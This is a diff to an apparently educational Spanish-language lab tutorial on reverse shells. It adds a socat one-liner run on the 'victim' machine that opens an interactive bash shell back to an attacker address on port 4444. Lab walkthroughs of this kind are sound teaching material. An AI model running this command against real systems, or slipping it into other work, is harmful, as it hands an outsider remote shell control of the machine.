@@ -153,6 +153,9 @@ En la máquina atancante:
   ![](capturas/shell-reversa-socat-mv-atacante.png)
 
 - En la máquina víctima: Ejecutaremos otro comando socat para conectar con tu servidor y establecer la shell reversa. Necesitaremos la dirección IP de la máquina atacante.
+  ```
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.103:4444
+  ```
   ![](capturas/shell-reversa-socat-mv-victima.png)
 
 - Comenzamos la explotación:
